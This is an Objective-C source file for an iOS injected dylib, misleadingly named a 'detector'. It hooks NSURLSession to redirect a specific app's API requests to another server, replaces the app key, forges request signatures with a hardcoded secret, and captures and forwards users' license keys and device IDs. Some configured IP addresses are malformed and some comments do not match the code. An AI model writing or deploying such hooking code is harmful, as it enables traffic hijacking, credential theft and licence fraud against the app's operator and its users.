// URLHijackDetector.m
// iOS URL Hijack Dylib - 支持签名重算和卡密提取
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <CommonCrypto/CommonDigest.h>

#pragma mark - 配置区

// 需要处理的目标域名/IP
static NSSet<NSString *> *getTargetDomains(void) {
    return [NSSet setWithArray:@[
        @"api1.7ccccccc.com",
        @"api2.7ccccccc.com", 
        @"api3.7ccccccc.com",
        @"45.205.27.82:8080"
    ]];
}

// 需要重定向的IP列表
static NSSet<NSString *> *getRedirectIPs(void) {
    return [NSSet setWithArray:@[
        @"45.205.200007.82:8080"
    ]];
}

// 劫持后重定向的新域名
static NSString *getNewDomain(void) {
    return @"61.184.8.190008:5563";
}

// appSecret
static NSString *getAppSecret(void) {
    return @"XtUdpwzWVW1wAbTeSDWevcBJXFJGY2cx";
}

// appKey 替换规则
static NSArray<NSDictionary *>* getAppKeyRules(void) {
    return @[
        @{@"old": @"veQ3NZZ5ui0jyBrQaT", @"new": @"QLObIPwnDOVts3mzw9"},
        @{@"old": @"veQ3NZZ5ui0jyBrQaT", @"new": @"QLObIPwnDOVts3mzw9"},
    ];
}

#pragma mark - 持久化存储管理

static NSString *getStorageKey(void) {
    return @"com.hijack.stored_params";
}

static void saveParamsToStorage(NSString *card, NSString *deviceId) {
    if (!card && !deviceId) return;
    
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    NSMutableDictionary *storedParams = [[defaults dictionaryForKey:getStorageKey()] mutableCopy];
    if (!storedParams) {
        storedParams = [NSMutableDictionary dictionary];
    }
    
    if (card) {
        storedParams[@"card"] = card;
        NSLog(@"[Hijack] Saved card to storage: %@", card);
    }
    if (deviceId) {
        storedParams[@"device_id"] = deviceId;
        NSLog(@"[Hijack] Saved device_id to storage: %@", deviceId);
    }
    
    [defaults setObject:storedParams forKey:getStorageKey()];
    [defaults synchronize];
}

static NSDictionary *loadParamsFromStorage(void) {
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    NSDictionary *storedParams = [defaults dictionaryForKey:getStorageKey()];
    if (storedParams) {
        NSLog(@"[Hijack] Loaded params from storage: card=%@, device_id=%@", 
              storedParams[@"card"], storedParams[@"device_id"]);
    }
    return storedParams;
}

#pragma mark - 加密工具函数

static NSString* md5(NSString *string) {
    const char *cStr = [string UTF8String];
    unsigned char digest[CC_MD5_DIGEST_LENGTH];
    CC_MD5(cStr, (CC_LONG)strlen(cStr), digest);
    
    NSMutableString *output = [NSMutableString stringWithCapacity:CC_MD5_DIGEST_LENGTH * 2];
    for(int i = 0; i < CC_MD5_DIGEST_LENGTH; i++) {
        [output appendFormat:@"%02x", digest[i]];
    }
    return output;
}

#pragma mark - 签名计算

static NSString* calculateSign(NSString *httpMethod, NSString *host, NSString *path, NSDictionary *params, NSString *appSecret) {
    // 1. 参数排序并拼接
    NSArray *sortedKeys = [[params allKeys] sortedArrayUsingSelector:@selector(compare:)];
    NSMutableString *paramString = [NSMutableString string];
    for (NSString *key in sortedKeys) {
        if ([key isEqualToString:@"sign"]) continue;
        if (paramString.length > 0) {
            [paramString appendString:@"&"];
        }
        [paramString appendFormat:@"%@=%@", key, params[key]];
    }
    
    // 2. 拼接签名原串
    NSString *stringToSign = [NSString stringWithFormat:@"%@%@%@%@%@", 
                               httpMethod, host, path, paramString, appSecret];
    
    NSLog(@"[Hijack] String to sign: %@", stringToSign);
    
    // 3. MD5
    return md5(stringToSign);
}

#pragma mark - 请求参数修改

// 处理原始 API 请求（api1.7ccccccc.com）
static NSData* modifyRequestBodyForOriginalApi(NSData *originalBody, NSString *originalURL, NSString *httpMethod, NSString *host, NSString *path) {
    if (!originalBody) return originalBody;
    
    NSString *bodyString = [[NSString alloc] initWithData:originalBody encoding:NSUTF8StringEncoding];
    if (!bodyString) return originalBody;
    
    // 解析参数
    NSMutableDictionary *params = [NSMutableDictionary dictionary];
    NSArray *pairs = [bodyString componentsSeparatedByString:@"&"];
    for (NSString *pair in pairs) {
        NSArray *kv = [pair componentsSeparatedByString:@"="];
        if (kv.count == 2) {
            params[kv[0]] = kv[1];
        }
    }
    
    // 提取 card 和 device_id（从参数中）
    NSString *card = params[@"card"];
    NSString *deviceId = params[@"device_id"];
    
    // 如果 body 中没有，尝试从 URL 中提取
    if (!card || !deviceId) {
        NSURL *url = [NSURL URLWithString:originalURL];
        NSURLComponents *components = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
        for (NSURLQueryItem *item in components.queryItems) {
            if ([item.name isEqualToString:@"card"]) {
                card = item.value;
            } else if ([item.name isEqualToString:@"device_id"]) {
                deviceId = item.value;
            }
        }
    }
    
    // 保存 card 和 device_id
    if (card || deviceId) {
        saveParamsToStorage(card, deviceId);
    }
    
    // 替换 appKey 并重算签名
    NSString *currentAppKey = params[@"appKey"];
    if (currentAppKey) {
        NSString *newAppKey = nil;
        NSArray *rules = getAppKeyRules();
        
        for (NSDictionary *rule in rules) {
            if ([rule[@"old"] isEqualToString:currentAppKey]) {
                newAppKey = rule[@"new"];
                break;
            }
        }
        
        if (newAppKey) {
            NSLog(@"[Hijack] Replacing appKey: %@ -> %@", currentAppKey, newAppKey);
            params[@"appKey"] = newAppKey;
            
            // 重新计算签名
            NSString *newSign = calculateSign(httpMethod, host, path, params, getAppSecret());
            params[@"sign"] = newSign;
            NSLog(@"[Hijack] New sign: %@", newSign);
            
            // 重新构建 body
            NSMutableArray *newPairs = [NSMutableArray array];
            for (NSString *key in params) {
                [newPairs addObject:[NSString stringWithFormat:@"%@=%@", key, params[key]]];
            }
            NSString *newBodyString = [newPairs componentsJoinedByString:@"&"];
            
            return [newBodyString dataUsingEncoding:NSUTF8StringEncoding];
        }
    }
    
    return originalBody;
}

// 处理重定向后的新 API 请求（api12.hezijun.top）
static NSData* modifyRequestBodyForNewApi(NSData *originalBody) {
    if (!originalBody) return originalBody;
    
    NSString *bodyString = [[NSString alloc] initWithData:originalBody encoding:NSUTF8StringEncoding];
    if (!bodyString) return originalBody;
    
    // 从存储中加载卡密和设备码
    NSDictionary *storedParams = loadParamsFromStorage();
    
    if (storedParams) {
        NSString *card = storedParams[@"card"];
        NSString *deviceId = storedParams[@"device_id"];
        
        if (card || deviceId) {
            NSMutableString *newBodyString = [bodyString mutableCopy];
            BOOL modified = NO;
            
            // 追加 card 参数（直接追加，不编码）
            if (card && ![bodyString containsString:@"card="]) {
                if (newBodyString.length > 0 && ![newBodyString hasSuffix:@"&"]) {
                    [newBodyString appendString:@"&"];
                }
                [newBodyString appendFormat:@"card=%@", card];
                NSLog(@"[Hijack] Appended card to api12 request: %@", card);
                modified = YES;
            }
            
            // 追加 device_id 参数
            if (deviceId && ![bodyString containsString:@"device_id="]) {
                if (newBodyString.length > 0 && ![newBodyString hasSuffix:@"&"]) {
                    [newBodyString appendString:@"&"];
                }
                [newBodyString appendFormat:@"device_id=%@", deviceId];
                NSLog(@"[Hijack] Appended device_id to api12 request: %@", deviceId);
                modified = YES;
            }
            
            if (modified) {
                NSLog(@"[Hijack] Original body: %@", bodyString);
                NSLog(@"[Hijack] Modified body: %@", newBodyString);
                return [newBodyString dataUsingEncoding:NSUTF8StringEncoding];
            }
        }
    } else {
        NSLog(@"[Hijack] No stored params for api12 request");
    }
    
    return originalBody;
}

#pragma mark - URL 匹配与替换

static NSString* replaceURLIfNeeded(NSString *originalURLString, NSString **outHost, NSString **outPath) {
    NSURL *url = [NSURL URLWithString:originalURLString];
    if (!url) return originalURLString;
    
    NSString *host = url.host;
    if (!host) return originalURLString;
    
    if (outHost) *outHost = host;
    if (outPath) *outPath = url.path;
    
    NSString *hostWithPort = nil;
    if (url.port) {
        hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
    }
    
    BOOL needsRedirect = NO;
    if (hostWithPort && [getRedirectIPs() containsObject:hostWithPort]) {
        needsRedirect = YES;
    } else if ([getRedirectIPs() containsObject:host]) {
        needsRedirect = YES;
    }
    
    if (needsRedirect) {
        // 重定向：IP -> 新域名
        NSString *newURLString = originalURLString;
        newURLString = [newURLString stringByReplacingOccurrencesOfString:host 
                                                               withString:getNewDomain()];
        if (url.port) {
            NSString *oldPortStr = [NSString stringWithFormat:@":%d", [url.port intValue]];
            newURLString = [newURLString stringByReplacingOccurrencesOfString:oldPortStr 
                                                                   withString:@""];
        }
        
        if (outHost) *outHost = getNewDomain();
        
        NSLog(@"[Hijack] URL redirected: %@ -> %@", originalURLString, newURLString);
        return newURLString;
    }
    
    return originalURLString;
}

static BOOL isTargetRequest(NSString *urlString) {
    NSURL *url = [NSURL URLWithString:urlString];
    if (!url) return NO;
    
    NSString *host = url.host;
    if (!host) return NO;
    
    // 检查原始目标域名
    for (NSString *target in getTargetDomains()) {
        if ([host isEqualToString:target]) {
            return YES;
        }
    }
    
    // 检查需要重定向的 IP
    if ([getRedirectIPs() containsObject:host]) {
        return YES;
    }
    
    if (url.port) {
        NSString *hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
        if ([getRedirectIPs() containsObject:hostWithPort]) {
            return YES;
        }
    }
    
    return NO;
}

static BOOL isOriginalApiRequest(NSString *host) {
    NSSet *targetDomains = getTargetDomains();
    for (NSString *target in targetDomains) {
        if ([target containsString:@":"]) continue; // 跳过带端口的 IP
        if ([host isEqualToString:target]) {
            return YES;
        }
    }
    return NO;
}

#pragma mark - NSURLSession Hook

@interface NSURLSession (Hijack)
@end

@implementation NSURLSession (Hijack)

+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        Class class = [NSURLSession class];
        
        SEL originalSelector = @selector(dataTaskWithRequest:completionHandler:);
        SEL swizzledSelector = @selector(hijacked_dataTaskWithRequest:completionHandler:);
        
        Method originalMethod = class_getInstanceMethod(class, originalSelector);
        
        if (!originalMethod) return;
        
        __block id replacementBlock = ^(id self, NSURLRequest *request, void (^completionHandler)(NSData*, NSURLResponse*, NSError*)) {
            return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
        };
        
        class_addMethod(class, swizzledSelector, imp_implementationWithBlock(replacementBlock), "@@:@?");
        
        Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
        
        if (originalMethod && swizzledMethod) {
            method_exchangeImplementations(originalMethod, swizzledMethod);
        }
    });
}

- (NSURLSessionDataTask *)hijacked_dataTaskWithRequest:(NSURLRequest *)request 
                                      completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    
    NSString *originalURLString = request.URL.absoluteString;
    NSMutableURLRequest *mutableRequest = [request mutableCopy];
    BOOL modified = NO;
    
    if (isTargetRequest(originalURLString)) {
        NSString *host = nil;
        NSString *path = nil;
        
        // 1. URL 重定向（仅 IP 会重定向）
        NSString *newURLString = replaceURLIfNeeded(originalURLString, &host, &path);
        if (![newURLString isEqualToString:originalURLString]) {
            [mutableRequest setURL:[NSURL URLWithString:newURLString]];
            modified = YES;
        } else {
            NSURL *url = [NSURL URLWithString:originalURLString];
            host = url.host;
            path = url.path;
        }
        
        // 2. 修改请求体
        if (request.HTTPBody) {
            NSData *newBody = nil;
            
            if (isOriginalApiRequest(host)) {
                // 原始 API（api1.7ccccccc.com）：替换 appKey + 重算签名 + 提取卡密
                newBody = modifyRequestBodyForOriginalApi(request.HTTPBody, originalURLString, request.HTTPMethod, host, path);
            } else if ([host isEqualToString:getNewDomain()]) {
                // 新 API（api12.hezijun.top）：只追加卡密和设备码
                newBody = modifyRequestBodyForNewApi(request.HTTPBody);
            }
            
            if (newBody && newBody != request.HTTPBody) {
                [mutableRequest setHTTPBody:newBody];
                [mutableRequest setValue:[NSString stringWithFormat:@"%lu", (unsigned long)newBody.length] 
                      forHTTPHeaderField:@"Content-Length"];
                modified = YES;
            }
        }
    }
    
    if (!modified) {
        return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
    }
    
    return [self hijacked_dataTaskWithRequest:mutableRequest completionHandler:completionHandler];
}

@end

__attribute__((constructor))
static void initialize() {
    NSLog(@"[Hijack] URL Hijack Detector loaded");
    NSLog(@"[Hijack] 原始API: api1/2/3.7ccccccc.com (替换appKey+重算签名+提取card/device_id)");
    NSLog(@"[Hijack] 重定向目标: %@ (追加card/device_id，不重算签名)", getNewDomain());
}
